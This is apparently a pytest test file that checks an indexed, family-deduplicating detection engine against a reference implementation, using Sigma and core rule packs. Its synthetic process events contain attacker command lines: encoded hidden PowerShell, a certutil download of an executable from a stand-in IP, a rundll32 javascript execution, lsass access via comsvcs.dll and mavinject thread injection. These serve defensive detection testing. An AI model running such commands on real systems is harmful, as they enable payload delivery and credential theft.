"""DetectionEngine scope index, rule families, and the no-explanation fast path
(ADR-0007 follow-up, T4.5).

The central property: the indexed, family-deduplicating engine returns exactly
what a plain reference implementation returns (every rule tried in pack order,
first firing rule per family kept) — on the real core + Sigma packs and on
Observations chosen to exercise every index path.
"""

from __future__ import annotations

import json
from collections.abc import Sequence
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

import pytest

from attribution_platform.attack_knowledge.loader import AttackKnowledge, load_attack_knowledge
from attribution_platform.detection import (
    DetectionEngine,
    DetectionError,
    DetectionResult,
    DetectionRule,
    FieldCondition,
    load_rule_pack,
)
from attribution_platform.domain import (
    EventMetadata,
    NetworkEndpoint,
    NetworkInfo,
    Observation,
    ProcessAccessRef,
    ProcessRef,
    RemoteThreadRef,
    SourceRef,
)
from attribution_platform.extraction import RuleRef

REPO_ROOT = Path(__file__).resolve().parents[1]
CORE_PACK = REPO_ROOT / "fixtures" / "phase1_core_rules.json"
SIGMA_PACK = (
    REPO_ROOT
    / "data"
    / "detection"
    / "sigma"
    / "r2026-07-01"
    / "generated"
    / "sigma-r2026-07-01-sigma_core++.rules.json"
)
WHOAMI_FAMILY = "sigma:c248c896-e412-4279-8c15-1c558067b6fa"


@pytest.fixture(scope="module")
def knowledge() -> AttackKnowledge:
    return load_attack_knowledge()


@pytest.fixture(scope="module")
def fixture_knowledge() -> AttackKnowledge:
    # fixtures/phase1_core_rules.json is frozen against this ATT&CK release.
    return load_attack_knowledge("enterprise-attack-19.0")


@pytest.fixture(scope="module")
def all_rules(
    knowledge: AttackKnowledge, fixture_knowledge: AttackKnowledge
) -> tuple[DetectionRule, ...]:
    # The engine is ATT&CK-version agnostic; the core rules (unscoped, no
    # family) and the Sigma rules (scoped, families) exercise every index path.
    return (
        load_rule_pack(CORE_PACK, knowledge=fixture_knowledge).rules
        + load_rule_pack(SIGMA_PACK, knowledge=knowledge).rules
    )


def _reference_evaluate(
    rules: Sequence[DetectionRule], observations: Sequence[Observation]
) -> tuple[DetectionResult, ...]:
    """The specification: every rule in order, first firing rule per family."""
    out: list[DetectionResult] = []
    for observation in observations:
        fired: set[str] = set()
        for rule in rules:
            if rule.rule_family is not None and rule.rule_family in fired:
                continue
            result = rule.evaluate(observation)
            if result is not None:
                out.append(result)
                if rule.rule_family is not None:
                    fired.add(rule.rule_family)
    return tuple(out)


def _obs(observation_id: str, **entities: Any) -> Observation:
    return Observation(
        observation_id=observation_id,
        timestamp=datetime(2026, 1, 1, tzinfo=UTC),
        raw_reference=SourceRef(source_type="synthetic", source_event_id=f"raw-{observation_id}"),
        **entities,
    )


def _process(observation_id: str, executable: str, command_line: str, **event: Any) -> Observation:
    return _obs(
        observation_id,
        event=EventMetadata(kind="event", **event),
        process=ProcessRef(executable=executable, command_line=command_line, name=None),
    )


def _mixed_observations() -> list[Observation]:
    proc = {"category": ("process",), "type": ("start",)}
    return [
        _process("whoami", "C:\\Windows\\System32\\whoami.exe", "whoami /all -all", **proc),
        _process(
            "encoded-ps",
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe -nop -w hidden -enc SQBFAFgA",
            **proc,
        ),
        _process(
            "certutil",
            "C:\\Windows\\System32\\certutil.exe",
            "certutil.exe -urlcache -split -f http://203.0.113.5/a.exe a.exe",
            **proc,
        ),
        _process(
            "rundll32",
            "C:\\Windows\\System32\\rundll32.exe",
            'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)',
            **proc,
        ),
        _process("benign", "C:\\Program Files\\App\\app.exe", "app.exe --run", **proc),
        # upper-case category: only case-insensitive scope conditions may match
        _process(
            "upper", "C:\\Windows\\System32\\whoami.exe", "whoami /all", category=("PROCESS",)
        ),
        # no event metadata at all, and no category
        _obs("no-event", process=ProcessRef(executable="C:\\Windows\\System32\\whoami.exe")),
        _process("no-category", "C:\\Windows\\System32\\whoami.exe", "whoami /all"),
        _obs(
            "network",
            event=EventMetadata(kind="event", category=("network",), type=("connection", "start")),
            process=ProcessRef(executable="C:\\Windows\\System32\\rundll32.exe"),
            network=NetworkInfo(
                destination=NetworkEndpoint(ip="203.0.113.7", port=4444), transport="tcp"
            ),
        ),
        _obs(
            "two-categories",
            event=EventMetadata(kind="event", category=("process", "network"), type=("start",)),
            process=ProcessRef(
                executable="C:\\Windows\\System32\\whoami.exe", command_line="whoami /all"
            ),
        ),
        # process events of other types: the second-level (event.type) filter
        _obs(
            "process-access",
            event=EventMetadata(kind="event", category=("process",), type=("access",)),
            process=ProcessRef(executable="C:\\Windows\\System32\\rundll32.exe"),
            target_process=ProcessRef(executable="C:\\Windows\\system32\\lsass.exe"),
            process_access=ProcessAccessRef(granted_access="0x1fffff", call_trace="comsvcs.dll"),
        ),
        _obs(
            "remote-thread",
            event=EventMetadata(
                kind="event",
                category=("process",),
                type=("change",),
                action="create_remote_thread",
            ),
            process=ProcessRef(executable="C:\\Windows\\System32\\mavinject.exe"),
            target_process=ProcessRef(executable="C:\\Windows\\System32\\notepad.exe"),
            remote_thread=RemoteThreadRef(start_function="LoadLibraryW"),
        ),
        _obs(
            "upper-type",
            event=EventMetadata(kind="event", category=("process",), type=("START",)),
            process=ProcessRef(executable="C:\\Windows\\System32\\whoami.exe"),
        ),
    ]


# ===========================================================================
# Equivalence with the reference specification
# ===========================================================================


def test_indexed_engine_equals_reference_on_real_packs(
    all_rules: tuple[DetectionRule, ...],
) -> None:
    observations = _mixed_observations()
    fast = DetectionEngine(rules=all_rules).evaluate(observations)
    assert fast == _reference_evaluate(all_rules, observations)
    fired = {r.supporting_observation_ids[0] for r in fast}
    assert {"whoami", "encoded-ps", "certutil", "process-access"} <= fired  # not vacuous
    assert "benign" not in fired


def test_equivalence_with_rules_in_reverse_order(all_rules: tuple[DetectionRule, ...]) -> None:
    rules = tuple(reversed(all_rules))
    observations = _mixed_observations()
    assert DetectionEngine(rules=rules).evaluate(observations) == _reference_evaluate(
        rules, observations
    )


def test_index_skips_rules_for_other_categories(all_rules: tuple[DetectionRule, ...]) -> None:
    engine = DetectionEngine(rules=all_rules)
    network = next(o for o in _mixed_observations() if o.observation_id == "network")
    process = next(o for o in _mixed_observations() if o.observation_id == "benign")
    assert len(engine._candidates(network)) < len(all_rules) / 10
    assert len(engine._candidates(process)) < len(all_rules)


# ===========================================================================
# Rule families
# ===========================================================================


def _rule(rule_id: str, value: str, family: str | None) -> DetectionRule:
    return DetectionRule(
        rule_ref=RuleRef(rule_id=rule_id, rule_version="1"),
        conditions=(FieldCondition("process.command_line", "contains", value),),
        rule_family=family,
    )


def test_one_detection_per_family_per_observation() -> None:
    engine = DetectionEngine(
        rules=(
            _rule("a0", "whoami", "fam-a"),
            _rule("a1", "/all", "fam-a"),
            _rule("b0", "/all", "fam-b"),
            _rule("x", "whoami", None),
            _rule("y", "/all", None),
        )
    )
    results = engine.evaluate([_obs("o", process=ProcessRef(command_line="whoami /all"))])
    assert [r.rule_ref.rule_id for r in results] == ["a0", "b0", "x", "y"]


def test_family_dedup_is_per_observation() -> None:
    engine = DetectionEngine(rules=(_rule("a0", "x", "fam"), _rule("a1", "y", "fam")))
    results = engine.evaluate(
        [
            _obs("o1", process=ProcessRef(command_line="x")),
            _obs("o2", process=ProcessRef(command_line="y")),
        ]
    )
    assert [(r.rule_ref.rule_id, r.supporting_observation_ids) for r in results] == [
        ("a0", ("o1",)),
        ("a1", ("o2",)),
    ]


def test_real_sigma_siblings_collapse_to_one_detection(
    all_rules: tuple[DetectionRule, ...],
) -> None:
    whoami = tuple(r for r in all_rules if r.rule_family == WHOAMI_FAMILY)
    obs = next(o for o in _mixed_observations() if o.observation_id == "whoami")
    assert sum(r.evaluate(obs) is not None for r in whoami) >= 2  # two branches match...
    assert len(DetectionEngine(rules=whoami).evaluate([obs])) == 1  # ...one detection


def test_generated_sigma_rules_carry_family_equal_to_source(
    knowledge: AttackKnowledge, fixture_knowledge: AttackKnowledge
) -> None:
    pack = load_rule_pack(SIGMA_PACK, knowledge=knowledge)
    assert all(r.rule_family == r.rule_source for r in pack.rules)
    core = load_rule_pack(CORE_PACK, knowledge=fixture_knowledge)
    assert all(r.rule_family is None for r in core.rules)


def test_rule_family_validation(tmp_path: Path, knowledge: AttackKnowledge) -> None:
    with pytest.raises(DetectionError, match="rule_family"):
        _rule("r", "x", "   ")
    path = tmp_path / "p.json"
    path.write_text(
        json.dumps(
            {
                "pack_id": "p",
                "rules": [
                    {
                        "rule_id": "r",
                        "rule_version": "1",
                        "rule_family": 7,
                        "conditions": [
                            {"field_path": "process.name", "operator": "equals", "value": "a"}
                        ],
                    }
                ],
            }
        ),
        encoding="utf-8",
    )
    with pytest.raises(DetectionError, match="rule_family"):
        load_rule_pack(path, knowledge=knowledge)


# ===========================================================================
# Index exactness edge cases
# ===========================================================================


def test_scope_condition_not_first_is_still_evaluated() -> None:
    rule = DetectionRule(
        rule_ref=RuleRef(rule_id="late-scope", rule_version="1"),
        conditions=(
            FieldCondition("process.command_line", "contains", "x"),
            FieldCondition("event.category", "has_element", "process"),
        ),
    )
    obs = _obs(
        "o",
        event=EventMetadata(kind="event", category=("process",)),
        process=ProcessRef(command_line="x"),
    )
    assert len(DetectionEngine(rules=(rule,)).evaluate([obs])) == 1


def test_negated_scope_condition_is_not_indexed() -> None:
    rule = DetectionRule(
        rule_ref=RuleRef(rule_id="not-network", rule_version="1"),
        conditions=(
            FieldCondition("event.category", "has_element", "network", negate=True),
            FieldCondition("process.command_line", "contains", "x"),
        ),
    )
    obs = _obs(
        "o",
        event=EventMetadata(kind="event", category=("process",)),
        process=ProcessRef(command_line="x"),
    )
    assert len(DetectionEngine(rules=(rule,)).evaluate([obs])) == 1


def test_unscoped_rule_still_fails_closed_on_array_misuse() -> None:
    rule = DetectionRule(
        rule_ref=RuleRef(rule_id="bad", rule_version="1"),
        conditions=(FieldCondition("event.category", "equals", "process"),),
    )
    obs = _obs("o", event=EventMetadata(kind="event", category=("process",)))
    with pytest.raises(DetectionError):
        DetectionEngine(rules=(rule,)).evaluate([obs])


def test_matches_agrees_with_evaluate(all_rules: tuple[DetectionRule, ...]) -> None:
    observations = _mixed_observations()
    for rule in all_rules[::7]:
        for condition in rule.conditions:
            for obs in observations:
                assert condition.matches(obs) == (condition.evaluate(obs) is not None)
